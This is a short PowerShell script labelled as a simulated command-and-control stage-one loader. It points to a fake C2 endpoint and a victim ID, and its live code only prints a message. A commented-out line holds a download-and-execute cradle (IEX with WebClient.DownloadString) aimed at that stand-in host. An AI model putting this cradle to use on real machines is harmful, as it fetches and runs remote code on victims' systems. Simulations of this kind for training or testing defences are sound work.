# Simulated C2 PowerShell Stage-1 Loader
$target = "https://c2-fake-endpoint.internal:8443/heartbeat"
$id = "VICTIM-WIN-01"
Write-Host "Connecting to $target with ID $id"
# IEX (New-Object Net.WebClient).DownloadString($target)
